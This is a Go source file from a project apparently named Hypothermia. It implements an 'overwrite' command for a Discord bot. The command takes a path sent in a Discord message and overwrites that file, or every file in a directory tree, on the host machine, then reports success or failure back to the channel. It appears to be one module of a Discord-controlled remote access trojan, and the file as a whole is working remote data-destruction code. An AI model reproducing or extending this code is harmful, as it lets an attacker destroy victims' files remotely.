package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	ovUsage string = "[path]"

	ovArgsError       string = "🟥 Expected 1 argument."
	ovInfoError       string = "🟥 Failed to get info about the path."
	ovWalkError       string = "🟥 Failed to walk the path."
	ovFailedError     string = "🟥 Failed to overwrite."
	ovSomeFailedError string = "🟥 Failed to overwrite:\n\n%s"

	ovSuccess string = "🟩 Successfully overwritten."
)

func (*OverwriteCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, ovArgsError, ovUsage), m.Reference())
		return
	}

	var path string
	if strings.HasPrefix(args[0], "\"") {
		joined := strings.Join(args, " ")
		start := strings.Index(joined, "\"") + 1
		end := strings.Index(joined[start:], "\"") + start

		if start == 0 || end == -1 {
			s.ChannelMessageSendReply(m.ChannelID, uploadFormatError, m.Reference())
			return
		}

		path = joined[start:end]
	} else {
		path = args[0]
	}

	info, err := os.Stat(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, ovInfoError, m.Reference())
		return
	}

	if info.IsDir() {
		var failed []string

		err = filepath.WalkDir(path, func(filePath string, entry os.DirEntry, err error) error {
			if err != nil {
				failed = append(failed, filePath)
				return nil
			}

			if !entry.IsDir() {
				err := utils.OverwriteFile(filePath)
				if err != nil {
					failed = append(failed, filePath)
				}
			}

			return nil
		})

		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, ovWalkError, m.Reference())
			return
		}

		if len(failed) > 0 {
			s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(ovSomeFailedError, strings.Join(failed, "\n")), m.Reference())
			return
		}

		s.ChannelMessageSendReply(m.ChannelID, ovSuccess, m.Reference())
		return
	}

	err = utils.OverwriteFile(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, ovFailedError, m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, ovSuccess, m.Reference())
}

func (*OverwriteCommand) Name() string {
	return "overwrite"
}

func (*OverwriteCommand) Info() string {
	return "overwrites a file"
}

type OverwriteCommand struct{}
